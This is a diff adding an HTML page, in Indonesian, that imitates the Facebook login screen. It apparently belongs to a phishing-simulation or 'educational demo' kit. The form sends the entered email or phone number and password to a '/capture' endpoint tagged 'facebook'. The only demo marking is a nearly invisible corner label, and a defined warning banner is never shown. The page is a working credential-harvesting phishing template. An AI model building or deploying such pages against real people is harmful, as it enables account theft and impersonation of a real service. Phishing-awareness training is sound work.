@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook - Masuk</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;min-height:100vh;justify-content:center}
+.demo-banner{background:#dc2626;color:#fff;text-align:center;padding:8px;font-size:13px;font-weight:bold;position:fixed;top:0;left:0;right:0;z-index:999}
+.wrap{display:flex;gap:40px;align-items:center;margin-top:40px}
+.left{max-width:500px}
+.left h2{font-size:28px;color:#1b74e4;font-weight:bold;margin-bottom:10px}
+.left p{font-size:18px;color:#1c1e21}
+.card{background:#fff;width:396px;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1)}
+.form-group input{width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px}
+.form-group input:focus{outline:none;border-color:#1b74e4;box-shadow:0 0 0 2px rgba(27,116,228,0.2)}
+.btn{width:100%;padding:14px;background:#0866ff;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}
+.btn:hover{background:#165fe4}
+.forgot{display:block;text-align:center;margin:16px 0;color:#0866ff;font-size:14px;text-decoration:none}
+.divider{border-bottom:1px solid #dadde1;margin:20px 0}
+.new-btn{display:block;margin:0 auto;padding:14px 20px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:bold;cursor:pointer;text-decoration:none;width:fit-content}
+.new-btn:hover{background:#36a420}
+.footer{text-align:center;margin-top:20px;font-size:12px;color:#737373}
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="left">
+<h2>facebook</h2>
+<p>Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam kehidupan Anda.</p>
+</div>
+<div class="card">
+<form action="/capture" method="POST">
+<input type="hidden" name="template" value="facebook">
+<div class="form-group">
+<input type="text" name="username" placeholder="Email atau nomor telepon" required>
+</div>
+<div class="form-group">
+<input type="password" name="password" placeholder="Kata sandi" required>
+</div>
+<button type="submit" class="btn">Masuk</button>
+<a href="#" class="forgot">Lupa kata sandi?</a>
+<div class="divider"></div>
+<a href="#" class="new-btn">Buat akun baru</a>
+</form>
+</div>
+</div>
+<div style="position:fixed;bottom:5px;right:10px;font-size:10px;color:rgba(220,38,38,0.3);font-weight:bold">🔬 DEMO EDUKASI</div>
+</body>
+</html>
